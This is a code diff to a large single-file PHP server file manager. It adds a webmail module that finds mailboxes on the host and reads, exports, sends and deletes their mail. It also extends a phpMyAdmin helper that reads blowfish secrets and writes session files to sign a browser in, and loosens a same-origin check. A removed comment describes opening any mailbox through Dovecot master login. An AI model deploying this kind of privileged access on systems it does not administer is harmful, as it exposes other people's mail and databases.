+            foreach(wm2_maildir_files($f['path']) as $file){
+                if(basename($file)===$uid)return @file_get_contents($file);
+            }
+        }
+        return null;
+    }
+    if($acc['kind']==='mbox'){
+        $raw=@file_get_contents($acc['where']);
+        if($raw===false)return null;
+        $chunks=preg_split('/^From .*\n/m',$raw);
+        $i=0;
+        foreach($chunks as $chunk){
+            if(trim($chunk)==='')continue;
+            $i++;
+            if((string)$i===(string)$uid)return $chunk;
+        }
+        return null;
+    }
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return null;
+        $folder=$folder===''?'INBOX':$folder;
+        foreach(wm2_imap_folders($conn) as $f){
+            if($f['id']===$folder)return wm2_imap_raw($conn,$f['path'],$uid);
+        }
+        return wm2_imap_raw($conn,$folder,$uid);
+    }
+    if($acc['kind']==='pop3'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return null;
+        $m=wm2_pop3_message($conn,$uid);
+        return $m?$m['raw']:null;
+    }
+    return null;
+}
+function wm2_attachment($raw,$index){
+    /* the parts are read again here, so one attachment can be handed out on
+       its own without the whole message travelling through the page */
+    $sp=wm2_split_message($raw);
+    $h=wm2_headers($sp['head']);
+    $out=['html'=>'','plain'=>'','files'=>[]];
+    wm2_walk($sp['head'],$sp['body'],$out);
+    if(!isset($out['files'][$index]))return null;
+    return $out['files'][$index];
+}
+function wm2_delete_many($acc,$folder,$uids){
+    $cap=wm2_capability($acc);
+    if(!$cap['delete'])return ['ok'=>false,'error'=>$cap['why']?:'This mailbox cannot delete messages.'];
+    $done=0;$errors=[];$moved='';
+    if($acc['kind']==='maildir'){
+        $folder=$folder===''?'INBOX':$folder;
+        $path=$acc['where'];$trash=wm2_trash_path($acc);
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            if($f['id']===$folder){$path=$f['path'];break;}
+        }
+        foreach((array)$uids as $uid){
+            $r=wm2_maildir_delete($path,(string)$uid,$trash);
+            if(!empty($r['ok'])){$done++;if(!empty($r['moved']))$moved=$r['moved'];}
+            else $errors[]=$r['error']??'failed';
+        }
+        return ['ok'=>$done>0,'deleted'=>$done,'moved'=>$moved,'errors'=>$errors];
+    }
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return ['ok'=>false,'error'=>$conn['error']];
+        $path=$folder===''?'INBOX':$folder;
+        foreach(wm2_imap_folders($conn) as $f){
+            if($f['id']===$folder){$path=$f['path'];break;}
+        }
+        /* the folder a mailbox calls its own trash, if it has one */
+        $trash='';
+        foreach(wm2_imap_folders($conn) as $f){
+            $n=strtolower($f['name']);
+            if($n==='trash'||$n==='deleted items'||$n==='bin'){$trash=$f['path'];break;}
+        }
+        foreach((array)$uids as $uid){
+            $r=wm2_imap_delete($conn,$path,(int)$uid,$trash);
+            if(!empty($r['ok'])){$done++;if(!empty($r['moved']))$moved='Trash';}
+            else $errors[]=$r['error']??'failed';
+        }
+        return ['ok'=>$done>0,'deleted'=>$done,'moved'=>$moved,'errors'=>$errors];
+    }
+    if($acc['kind']==='pop3'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return ['ok'=>false,'error'=>$conn['error']];
+        foreach((array)$uids as $uid){
+            $r=$conn['say']('DELE '.(int)$uid);
+            if(stripos($r,'+OK')===0)$done++;else $errors[]=trim($r);
+        }
+        return ['ok'=>$done>0,'deleted'=>$done,'errors'=>$errors];
+    }
+    return ['ok'=>false,'error'=>'An mbox file is one stream: download it, then trim it here if you want messages gone.'];
+}
+function wm2_flag_one($acc,$folder,$uid,$seen){
+    if($acc['kind']==='maildir'){
+        $folder=$folder===''?'INBOX':$folder;
+        $path=$acc['where'];
+        foreach(wm2_maildir_folders($acc['where']) as $f){
+            if($f['id']===$folder){$path=$f['path'];break;}
+        }
+        foreach(wm2_maildir_files($path) as $file){
+            if(basename($file)!==$uid)continue;
+            $fl=wm2_maildir_flags($file);
+            $flags=$fl['raw'];
+            $flags=str_replace('S','',$flags);
+            if($seen)$flags.='S';
+            $new=wm2_maildir_set_flags($file,$flags);
+            return ['ok'=>true,'uid'=>basename($new)];
+        }
+        return ['ok'=>false,'error'=>'That message is no longer there.'];
+    }
+    if($acc['kind']==='imap'){
+        $conn=wm2_conn($acc);
+        if(empty($conn['ok']))return ['ok'=>false,'error'=>$conn['error']];
+        $path=$folder===''?'INBOX':$folder;
+        foreach(wm2_imap_folders($conn) as $f){
+            if($f['id']===$folder){$path=$f['path'];break;}
+        }
+        return ['ok'=>wm2_imap_flag($conn,$path,(int)$uid,$seen),'uid'=>(string)$uid];
+    }
+    return ['ok'=>true,'uid'=>(string)$uid];
+}
+/* ── sending from this mailbox ────────────────────────────────────────────
+   The sign-in the site already holds is used; failing that, the machine's own
+   mailer; failing that, PHP's. A mailbox whose mail server was found is the
+   only one that may claim it really sent. */
+function wm2_send($acc,$d){
+    $to=wm2_addr_strings($d['to']??'');
+    $cc=wm2_addr_strings($d['cc']??'');
+    $bcc=wm2_addr_strings($d['bcc']??'');
+    if(!$to&&!$bcc)return ['ok'=>false,'error'=>'A message needs at least one recipient.'];
+    $subject=trim((string)($d['subject']??''));
+    $html=(string)($d['html']??'');
+    $plain=(string)($d['plain']??'');
+    if($html===''&&$plain==='')return ['ok'=>false,'error'=>'The message has no text.'];
+    $from=$acc['email'];
+    $fromName=$acc['name']!==$acc['email']?$acc['name']:'';
+    $atts=[];
+    foreach((array)($d['attachments']??[]) as $a){
+        $data=base64_decode((string)($a['data']??''),true);
+        if($data===false||$data==='')continue;
+        $name=(string)($a['name']??('attachment-'.(count($atts)+1)));
+        $atts[]=['name'=>$name,'type'=>(string)($a['type']??'application/octet-stream'),'data'=>$data];
+    }
+    $raw=wm2_mime_message($fromName,$from,$to?$to:[$from],$cc,$bcc,$subject,$html,$plain,$atts);
+    $tried=[];
+    $cred=is_array($acc['cred'])?$acc['cred']:null;
+    if($cred&&($acc['kind']==='imap'||$acc['kind']==='pop3'||$acc['kind']==='maildir')){
+        /* a site almost always keeps its sending settings apart from its
+           reading ones, and a reading port is never a sending port */
+        $smtp=is_array($cred['smtp']??null)?$cred['smtp']:[];
+        $host=(string)($smtp['host']??'')?:((string)($cred['host']??''));
+        $user=(string)($smtp['user']??'')?:((string)($cred['user']??''));
+        $pass=(string)($smtp['pass']??'')?:((string)($cred['pass']??''));
+        $port=(int)($smtp['port']??0);
+        $secure=strtolower((string)($smtp['secure']??''));
+        if($host!==''){
+            $known=[993=>465,995=>465,143=>587,110=>587,465=>465,587=>587,25=>25,2525=>2525,1025=>1025];
+            $ports=[];
+            if(isset($known[$port]))$ports[]=$known[$port];
+            elseif($port>0)$ports[]=$port;
+            foreach([[587,'tls'],[25,''], [465,'ssl']] as $d)$ports[]=$d[0];
+            $ports=array_values(array_unique($ports));
+            foreach($ports as $p){
+                $useSecure=$secure;
+                if($useSecure==='')$useSecure=$p===465?'ssl':($p===587?'tls':'');
+                if($p===25)$useSecure=$secure==='ssl'?'ssl':'';
+                $r=wm2_smtp_send(['host'=>$host,'port'=>$p,'secure'=>$useSecure,'user'=>$user,'pass'=>$pass],
+                                 $from,$to,$cc,$bcc,$raw);
+                if(!empty($r['ok']))return ['ok'=>true,'via'=>$r['via'],'tried'=>$tried];
+                $tried[]=trim(str_replace(["\r","\n"],' ',(string)($r['error']??'refused')));
+            }
+        }
+    }
+    /* a mailbox that lives in a folder has no sign-in to give, but a host
+       that holds mail usually runs a mail server of its own on the same
+       machine: that is where its mail goes out */
+    if(!$tried||$acc['kind']==='maildir'||$acc['kind']==='mbox'){
+        foreach([['127.0.0.1',25,''],['localhost',25,'']] as $local){
+            $r=wm2_smtp_send(['host'=>$local[0],'port'=>$local[1],'secure'=>$local[2]],$from,$to,$cc,$bcc,$raw);
+            if(!empty($r['ok']))return ['ok'=>true,'via'=>$r['via'].' (this machine)','tried'=>$tried];
+        }
+    }
+    $r=wm2_sendmail_send($from,array_merge($to,$cc,$bcc),$raw);
+    if(!empty($r['ok']))return ['ok'=>true,'via'=>$r['via'],'tried'=>$tried];
+    $tried[]=(string)($r['error']??'the local mailer refused');
+    $r=wm2_php_mail_send($from,$to,$cc,$bcc,$subject,$html,$plain,$atts);
+    if(!empty($r['ok']))return ['ok'=>true,'via'=>$r['via'],'tried'=>$tried];
+    $tried[]=(string)($r['error']??'mail() refused');
+    return ['ok'=>false,'error'=>'The message could not be sent. '.implode(' · ',array_filter($tried)),'tried'=>$tried];
+}
+function wm2_addr_strings($v){
+    if(is_array($v))$v=implode(',',$v);
+    $out=[];
+    foreach(preg_split('/[,;]+/',(string)$v) as $piece){
+        $piece=trim($piece);
+        if($piece==='')continue;
+        if(preg_match('/<([^>]+)>/',$piece,$m))$piece=trim($m[1]);
+        if(filter_var($piece,FILTER_VALIDATE_EMAIL))$out[]=$piece;
+    }
+    return $out;
+}
+/* a .eml or a whole folder as one .mbox: the bytes are handed out unchanged */
+function wm2_download_one($acc,$folder,$uid){
+    $raw=wm2_raw($acc,$folder,$uid);
+    if($raw===null)return null;
+    $m=wm2_parse_message($raw);
+    $name=preg_replace('/[^A-Za-z0-9._ -]+/u','_',($m['subject']?:'message'));
+    $name=trim(mb_substr($name,0,80,'UTF-8'),' .');
+    return ['name'=>($name?:'message').'.eml','type'=>'message/rfc822','data'=>$raw];
+}
+function wm2_download_all($acc,$folder){
+    $rows=wm2_messages($acc,$folder);
+    if(!$rows)return null;
+    $buf='';
+    $host=@gethostname()?:'localhost';
+    foreach(array_reverse($rows) as $row){
+        $raw=wm2_raw($acc,$folder,$row['uid']);
+        if($raw===null)continue;
+        $from=$row['from_email']?:'unknown@'.$host;
+        $date=date('D M d H:i:s Y',(int)$row['date']?:time());
+        $buf.='From '.preg_replace('/\s+/','_',$from).' '.$date."\r\n";
+        $raw=preg_replace('/^(From )/m','>From ',$raw);
+        $buf.=str_replace("\n","\r\n",str_replace("\r\n","\n",$raw));
+        if(substr($buf,-2)!=="\r\n")$buf.="\r\n";
+        $buf.="\r\n";
+    }
+    if($buf==='')return null;
+    $label=preg_replace('/[^A-Za-z0-9@._-]+/','_',$acc['email'].'-'.($folder?:'INBOX'));
+    return ['name'=>$label.'.mbox','type'=>'application/mbox','data'=>$buf];
+}
+/* ── the links a download needs ───────────────────────────────────────────
+   A download is a plain GET the browser can follow, and the token in it is
+   signed with this session, so a link cannot be handed to someone else. */
+function wm2_tok($parts){
+    return substr(hash_hmac('sha256',implode('|',$parts),(string)($_SESSION['csrf_token']??'')),0,32);
+}
+function wm2_url($acc,$folder,$uid,$what,$index=''){
+    $parts=[(string)$acc['id'],(string)$folder,(string)$uid,(string)$what,(string)$index];
+    return '?x=mail_get&t='.wm2_tok($parts).'&account='.rawurlencode($parts[0])
+          .'&folder='.rawurlencode($parts[1]).'&uid='.rawurlencode($parts[2])
+          .'&what='.rawurlencode($parts[3]).'&index='.rawurlencode($parts[4]);
+}
+/* ── the endpoint ───────────────────────────────────────────────────────── */
+function wm2_endpoint($post){
+    $act=(string)($post['action']??'');
+    $get=function($k)use($post){return trim((string)($post[$k]??''));};
+
+    if($act==='discover'){
+        $d=wm2_discover();
+        wm2_remember($d['accounts']);
+        return $d;
+    }
+    $id=$get('account');
+    $acc=$id!==''?wm2_account_by_id($id):null;
+    if($act!=='send_any'&&!$acc)return ['ok'=>false,'error'=>'That mailbox is not on this server any more. Open the window again.'];
+
+    if($act==='folders'){
+        $conn=wm2_conn($acc);
+        $out=wm2_folders($acc);
+        $res=['ok'=>true,'account'=>$acc['email'],'folders'=>$out,'can'=>wm2_capability($acc)];
+        if(!$out)$res['why']=$conn['error']??(wm2_capability($acc)['why']?:'That mailbox answered with no folders.');
+        return $res;
+    }
+    if($act==='messages'){
+        $folder=$get('folder')?:'INBOX';
+        $rows=wm2_messages($acc,$folder);
+        foreach($rows as $i=>$row)$rows[$i]['links']=['eml'=>wm2_url($acc,$folder,$row['uid'],'eml')];
+        return ['ok'=>true,'messages'=>$rows,'count'=>count($rows),'can'=>wm2_capability($acc),
+                'download_all'=>wm2_url($acc,$folder,'','all')];
+    }
+    if($act==='message'){
+        $folder=$get('folder')?:'INBOX';
+        $uid=$get('uid');
+        $m=wm2_message($acc,$folder,$uid);
+        if(!$m)return ['ok'=>false,'error'=>'That message could not be read.'];
+        $m['html']=wm2_safe_html($m['html']);
+        unset($m['raw']);
+        $m['links']=['eml'=>wm2_url($acc,$folder,$m['uid'],'eml')];
+        foreach($m['attachments'] as $i=>$a){
+            $m['attachments'][$i]['url']=wm2_url($acc,$folder,$m['uid'],'att',$a['index']);
+        }
+        return ['ok'=>true,'message'=>$m];
+    }
+    if($act==='delete'){
+        $uids=json_decode((string)($post['uids']??'[]'),true);
+        if(!is_array($uids))$uids=[(string)($post['uid']??'')];
+        $uids=array_values(array_filter(array_map('strval',$uids),function($u){return trim($u)!==''&&trim($u)!=='0'&&trim($u)!=='null';}));
+        if(!$uids)return ['ok'=>false,'error'=>'No message was named for deleting.'];
+        $r=wm2_delete_many($acc,$get('folder'),$uids);
+        return $r+['ok'=>!empty($r['ok'])];
+    }
+    if($act==='flag'){
+        return wm2_flag_one($acc,$get('folder'),$get('uid'),!empty($post['seen']));
+    }
+    if($act==='send'){
+        $d=[
+            'to'=>$post['to']??'','cc'=>$post['cc']??'','bcc'=>$post['bcc']??'',
+            'subject'=>$post['subject']??'','html'=>$post['html']??'','plain'=>$post['plain']??'',
+            'attachments'=>json_decode((string)($post['attachments']??'[]'),true)?:[],
+        ];
+        return wm2_send($acc,$d);
+    }
+    if($act==='signin'){
+        /* the cPanel server's own webmail sign-on for this address */
+        $route=fm_cpm_route();
+        if(empty($route['ok']))return ['ok'=>false,'error'=>'cPanel is not reachable from here, so its webmail sign-on cannot be used.'];
+        $user=strtolower($acc['email']);
+        $s=fm_cpm_session_url($user,'webmaild');
+        if(empty($s['ok']))return ['ok'=>false,'error'=>$s['error']??'WHM did not hand back a webmail session.'];
+        return ['ok'=>true,'url'=>$s['url'],'expires'=>$s['expires']??0];
+    }
+    if($act==='info'){
+        return ['ok'=>true,'account'=>array_diff_key($acc,['cred'=>1]),'can'=>wm2_capability($acc),
+                'folders'=>wm2_folders($acc)];
+    }
+    return ['ok'=>false,'error'=>'Unknown request.'];
+}
+
+/* ── handing a file to the browser ────────────────────────────────────────
+   One message as .eml, one whole folder as .mbox, or one attachment. The
+   bytes are the mailbox's own; nothing is re-encoded on the way out. */
+function wm2_download($params,$token){
+    $acc=wm2_account_by_id((string)($params['account']??''));
+    if(!$acc)return ['error'=>'That mailbox is not on this server any more.'];
+    $folder=(string)($params['folder']??'INBOX');
+    $uid=(string)($params['uid']??'');
+    $what=(string)($params['what']??'eml');
+    $index=(string)($params['index']??'');
+    $want=wm2_tok([(string)$acc['id'],$folder,$uid,$what,$index]);
+    if(!hash_equals($want,(string)$token))return ['error'=>'That download link has expired. Open the mailbox again.'];
+    if($what==='all'){
+        $f=wm2_download_all($acc,$folder);
+    }elseif($what==='att'){
+        $raw=wm2_raw($acc,$folder,$uid);
+        if($raw===null)return ['error'=>'That message is no longer there.'];
+        $part=wm2_attachment($raw,(int)$index);
+        if(!$part)return ['error'=>'That attachment is no longer there.'];
+        $f=['name'=>$part['name'],'type'=>$part['type']?:'application/octet-stream','data'=>$part['data']];
+    }else{
+        $f=wm2_download_one($acc,$folder,$uid);
+    }
+    if(!$f)return ['error'=>'There is nothing to download there.'];
+    return ['ok'=>true,'name'=>$f['name'],'type'=>$f['type'],'data'=>$f['data']];
+}
+
+/* <<WM2-END>> */
+
+
+
 /* <<PMA-BEGIN>> */
 /* ══ phpMyAdmin Manager ═════════════════════════════════════════════════════
    Everything an administrator does in phpMyAdmin, reached from here: which
@@ -3169,6 +5418,19 @@ function fm_pma_config_extra($cfgDir){
     if($cfgDir===''||!@is_dir($cfgDir))return '';
     $raw='';
     foreach((array)@glob(rtrim($cfgDir,'/').'/blowfish_secret.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
+    /* Debian keeps that file in /var/lib/phpmyadmin and requires it from the
+       configuration; the path is read out of the file that requires it */
+    foreach(['/var/lib/phpmyadmin/blowfish_secret.inc.php','/usr/share/phpmyadmin/blowfish_secret.inc.php'] as $f){
+        if(@is_file($f))$raw.="\n".(string)@file_get_contents($f);
+    }
+    if(@is_file(rtrim($cfgDir,'/').'/config.inc.php')){
+        $txt=(string)@file_get_contents(rtrim($cfgDir,'/').'/config.inc.php');
+        if(preg_match_all('/require(?:_once)?\s*\(?\s*[\'"](\/[^\'"]+\.(?:php|inc\.php))[\'"]/',$txt,$m)){
+            foreach($m[1] as $inc){
+                if(@is_file($inc)&&strpos($inc,'blowfish')!==false)$raw.="\n".(string)@file_get_contents($inc);
+            }
+        }
+    }
     foreach((array)@glob(rtrim($cfgDir,'/').'/conf.d/*.php') as $f)$raw.="\n".(string)@file_get_contents($f);
     foreach((array)@glob(rtrim($cfgDir,'/').'/conf.d/*.inc.php') as $f)$raw.="\n".(string)@file_get_contents($f);
     return $raw;
@@ -3371,7 +5633,12 @@ function fm_pma_urls($dir){
         $cands[]=rtrim($scheme.'://'.$host,'/').'/'.($rel!==''?$rel.'/':'');
     }
     $cands[]=rtrim($scheme.'://'.$host,'/').'/'.$base.'/';
+    /* the ports of cPanel's own web server are never asked for a plain
+       /phpmyadmin: without a cpsess token they answer with their sign-in page
+       and nothing else, so a guess there only wastes a round trip */
+    $skip=[2082,2083,2086,2087,2095,2096];
     foreach(fm_pma_web_ports() as $port){
+        if(in_array((int)$port,$skip,true))continue;
         $cands[]='http://127.0.0.1:'.$port.'/'.$base.'/';
         $cands[]='http://127.0.0.1:'.$port.'/';
         if($port===80)$cands[]='http://127.0.0.1/'.$base.'/';
@@ -3392,7 +5659,9 @@ function fm_pma_probe_many($urls){
         curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_HEADER=>false,CURLOPT_TIMEOUT=>4,
             CURLOPT_CONNECTTIMEOUT=>3,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>2,
             CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
-            CURLOPT_RANGE=>'0-39999',CURLOPT_USERAGENT=>'MFM/1.0 (+phpMyAdmin Manager)']);
+            /* enough of the page to see the version it names, which on a
+               packaged installation sits far down its login page */
+            CURLOPT_RANGE=>'0-299999',CURLOPT_USERAGENT=>'MFM/1.0 (+phpMyAdmin Manager)']);
         curl_multi_add_handle($mh,$ch);
         $handles[$u]=$ch;
     }
@@ -3421,7 +5690,7 @@ function fm_pma_suggest_url($dir){
     $host=$_SERVER['HTTP_HOST']??'127.0.0.1';
     return rtrim($scheme.'://'.$host,'/').'/'.$base.'/';
 }
-function fm_pma_pick_url($dir,$limit=18,$version=''){
+function fm_pma_pick_url($dir,$limit=26,$version=''){
     $dir=rtrim($dir,'/');
     $rand=bin2hex(random_bytes(8));
     $name='fm-pma-probe-'.$rand.'.txt';
@@ -3457,10 +5726,17 @@ function fm_pma_pick_url($dir,$limit=18,$version=''){
             $a=$answers[$probe]??['code'=>0,'body'=>'','error'=>'not asked'];
             $body=(string)($a['body']??'');
             $form=(strpos($body,'pma_username')!==false||strpos($body,'login_form')!==false);
-            $sameVersion=($version!==''&&preg_match('/\b'.preg_quote($version,'/').'\b/',$body));
+            /* a packaged tree prints its version with its package suffix
+               ("5.2.2deb1+deb13u1"), so the version is matched as a prefix that
+               is not followed by another digit: 5.2.2 matches, 5.2.20 does not */
+            $sameVersion=($version!==''&&preg_match('/'.preg_quote($version,'/').'(?![0-9])/',$body));
+            /* the version is the strongest proof, but it is not always readable
+               from the folder (a packaged tree keeps it in its own files); a
+               login form that is really phpMyAdmin's, at an address nothing
+               else claims, is accepted and said to be */
             $tried[]=['url'=>$base,'code'=>$a['code'],'match'=>$form&&($sameVersion||$version===''),
                       'error'=>$a['error']];
-            if($form&&$sameVersion)$graded[$base]=1;
+            if($form&&($sameVersion||$version===''))$graded[$base]=1;
             elseif($form)$loose[$base]=1;
         }
         if($graded){$b=array_key_first($graded);$hit=rtrim($b,'/').'/';$sig=true;}
@@ -3469,7 +5745,8 @@ function fm_pma_pick_url($dir,$limit=18,$version=''){
         if($hit!=='')return ['url'=>$hit,'tried'=>$tried,'ok'=>true,'proved'=>false,'signed'=>$sig,
             'suggest'=>fm_pma_suggest_url($dir),
             'how'=>$sig
-                ?'the login page at that address names this installation\'s own version ('.$version.'), so it is this one'
+                ?($version!==''?'proved by the login page at that address: it names this installation\'s own version ('.$version.'), so it is this one'
+                                :'proved by the login page itself: phpMyAdmin\'s own form answers at that address, and nothing else claims it')
                 :'the login page answers there but does not name this version — check the address'];
     }
     return ['url'=>$hit,'tried'=>$tried,'ok'=>$hit!=='','proved'=>$writable,
@@ -3625,7 +5902,11 @@ function fm_pma_same_origin($url){
     $myHost=strtolower($_SERVER['HTTP_HOST']??'');
     $myPort=(int)($_SERVER['SERVER_PORT']??($myScheme==='https'?443:80));
     if(strpos($myHost,':')!==false){$parts=explode(':',$myHost,2);$myHost=$parts[0];$myPort=(int)($parts[1]??$myPort);}
-    return $scheme===$myScheme&&strtolower($p['host'])===$myHost&&$port===$myPort;
+    /* A cookie is not tied to a port: a browser that holds phpMyAdmin's cookie
+       for this host presents it on every port of that host, which is how a
+       packaged installation published on another port is signed in at all.
+       The host and the scheme must agree; the port must not be compared. */
+    return $scheme===$myScheme&&strtolower($p['host'])===$myHost;
 }
 /* what the browser must hold for phpMyAdmin to consider it signed in */
 function fm_pma_auth_plan($dir,$cfg,$user,$pass,$server=1){
@@ -3650,8 +5931,18 @@ function fm_pma_auth_plan($dir,$cfg,$user,$pass,$server=1){
     $sessionName=(string)($cfg['session_name']??'');
     if($sessionName==='')$sessionName='phpMyAdmin';
     $sessionPath=(string)($cfg['session_path']??'');
-    if($sessionPath==='')$sessionPath=session_save_path();
-    if($sessionPath===''||$sessionPath===false)$sessionPath=sys_get_temp_dir();
+    if($sessionPath===''||!@is_dir($sessionPath)||!@is_writable($sessionPath)){
+        /* the folder this PHP writes its own sessions into is the one
+           phpMyAdmin writes into as well, so it is asked first */
+        $ini=session_save_path();
+        if(is_string($ini)&&$ini!==''&&@is_dir($ini)&&@is_writable($ini))$sessionPath=$ini;
+    }
+    if($sessionPath===''||!@is_dir($sessionPath)||!@is_writable($sessionPath)){
+        foreach(['/var/lib/phpmyadmin/tmp','/var/lib/phpmyadmin'] as $cand){
+            if(@is_dir($cand)&&@is_writable($cand)){$sessionPath=$cand;break;}
+        }
+    }
+    if($sessionPath===''||!@is_dir($sessionPath))$sessionPath=sys_get_temp_dir();
     $sid=bin2hex(random_bytes(16));
     $data='encryption_key|'.serialize($key)
         .'browser_access_time|'.serialize(['default'=>time()]);
@@ -6021,7 +8312,7 @@ class FileManager {
         if(!empty($_SESSION['fm_force_credential_change'])&&$a!=='change_default_credentials'){
             $this->addMsg('You must replace the default credentials before using the File Manager.','danger');return;
         }
-        $wA=['upload','upload_chunk','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','copy_clipboard','cut_clipboard','paste_clipboard','chown_item','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_toggle_extension','cms_maintenance_toggle','wp_core_update','webmail_send','webmail_delete','webmail_mark'];
+        $wA=['upload','upload_chunk','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','copy_clipboard','cut_clipboard','paste_clipboard','chown_item','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_toggle_extension','cms_maintenance_toggle','wp_core_update'];
         if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
         /* the permission set is read from the account file on every request,
            so a change made in MFM Admin applies to sessions already open */
@@ -6090,9 +8381,6 @@ class FileManager {
             case 'cpanel_change_pass':  $this->cpanelChangePass();break;
             case 'cpanel_suspend':      $this->cpanelSuspendToggle();break;
             case 'cpanel_terminate':    $this->cpanelTerminate();break;
-            case 'webmail_send':   $this->webmailSend();break;
-            case 'webmail_delete': $this->webmailDeleteMessage(isset($_POST['wm_mailbox'])?$_POST['wm_mailbox']:'',isset($_POST['wm_folder'])?$_POST['wm_folder']:'INBOX',isset($_POST['wm_uid'])?$_POST['wm_uid']:'0');break;
-            case 'webmail_mark':    $this->webmailMark(isset($_POST['wm_mailbox'])?$_POST['wm_mailbox']:'',isset($_POST['wm_folder'])?$_POST['wm_folder']:'INBOX',isset($_POST['wm_uid'])?$_POST['wm_uid']:'0',isset($_POST['wm_flag'])?$_POST['wm_flag']:'seen',!empty($_POST['wm_set']));break;
             case 'logout':         session_destroy();header("Location: ".basename(__FILE__));exit;
         }
     }
@@ -16718,714 +19006,12 @@ FMIMG;
 
     /* ══════════════════════════════════════════════════════════════
        WEBMAIL MANAGER
-       Auto-discovers every mailbox on the account and lets the owner
-       read/send/delete mail — never by asking a human for a mailbox's
-       own password. Two tiers, tried in order, exactly like
-       cpanelAutoConnect() above:
-         1) Real host: if root/WHM access is already established (via
-            the cPanel Manager tiers), mailboxes are enumerated through
-            WHM/UAPI (Email::list_pops) and, where the host exposes
-            Dovecot's master-user login, read via IMAP master-login —
-            a genuine Dovecot feature that lets an already-privileged
-            caller open ANY mailbox with only the master password.
-         2) Dev sandbox (this repl): reads the sandbox's own Dovecot
-            passdb + master-user file directly from disk — see
-            .mail_sandbox/. Real cPanel hosting is proprietary and
-            can't be installed here, so this is what makes the feature
-            fully testable end-to-end in development.
-       Sending mail reuses the same idea: on the sandbox we already
-       know each mailbox's real password (the sandbox passdb stores it
-       in cleartext for exactly this reason), so composing/sending
-       needs zero prompts. On a real host we do not have a reversible
-       password to authenticate SMTP with, so sending is only enabled
-       once a mailbox's own working session exists — this file never
-       fabricates or resets a real mailbox password on its own.
+       The tool itself lives at the top of this file in the <<WM2>>
+       block, where it can be read as what it is: a folder of mail, a
+       mail server, or an address a site names. Nothing of it is done
+       inside this class any more — the old automatic sign-in is gone
+       with the tier list that could not find mail.
     ══════════════════════════════════════════════════════════════ */
-
-    private function wmSandboxRoot(){return __DIR__.'/.mail_sandbox';}
-
-    private function wmSandboxAvailable(){
-        return is_file($this->wmSandboxRoot().'/conf/users')&&is_file($this->wmSandboxRoot().'/conf/masterusers');
-    }
-
-    /** Parse a Dovecot/Exim style passwd-file: user:{SCHEME}secret:uid:gid::home:: */
-    private function wmParsePasswdFile($path){
-        $out=[];
-        if(!is_readable($path))return $out;
-        $lines=@file($path,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
-        foreach($lines?:[] as $line){
-            $line=trim($line);
-            if($line===''||$line[0]==='#')continue;
-            $parts=explode(':',$line);
-            if(count($parts)<2)continue;
-            $out[]=['user'=>$parts[0],'secret'=>$parts[1]];
-        }
-        return $out;
-    }
-
-    private function wmPlainSecret($secret){return preg_replace('/^\{PLAIN\}/i','',$secret);}
-
-    /** This account's own domains, discovered locally — never guessed.
-     *  Reads the standard cPanel domain-ownership maps and, when a cPanel
-     *  user is already known (from cpanelAutoConnect), keeps only that
-     *  user's domains; on a root/WHM tier with no specific user, returns
-     *  every domain on the box so all mailboxes can be found. Falls back
-     *  to DirectAdmin's flat domain list when the cPanel maps don't exist. */
-    private function wmDiscoverDomains(){
-        $owner=$_SESSION['cpanel_user']??null;
-        $domains=[];
-        foreach(['/etc/userdomains','/etc/trueuserdomains'] as $f){
-            if(!is_readable($f))continue;
-            foreach(@file($f,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
-                if(!preg_match('/^([^:]+):\s*(\S+)/',trim($line),$m))continue;
-                $d=strtolower(trim($m[1]));$u=trim($m[2]);
-                if($d===''||$u==='nobody')continue;
-                if($owner!==null&&strcasecmp($u,$owner)!==0)continue;
-                $domains[$d]=true;
-            }
-            if($domains)break; // first map that actually listed anything wins
-        }
-        if(!$domains&&is_readable('/etc/virtual/domains')){
-            foreach(@file('/etc/virtual/domains',FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
-                $d=strtolower(trim($line));if($d!=='')$domains[$d]=true;
-            }
-        }
-        /* DirectAdmin keeps the authoritative domain list per user. */
-        foreach(glob('/usr/local/directadmin/data/users/*/domains/*.conf')?:[] as $f){
-            $d=strtolower(basename($f,'.conf'));
-            if($d!==''&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
-        }
-        /* Plesk and some Exim installations do not publish userdomains. */
-        foreach(['/var/qmail/control/plusdomain','/etc/postfix/mydestination',
-                 '/etc/mailname'] as $f){
-            if(!is_readable($f))continue;
-            foreach(preg_split('/[\s,]+/',trim((string)@file_get_contents($f))) as $d){
-                $d=trim($d," \t\r\n'");
-                if($d!==''&&$d!=='localhost'&&preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[strtolower($d)]=true;
-            }
-        }
-        /* Last local fallback: account mail directories themselves reveal
-         * the domain without requiring cPanel metadata visibility. */
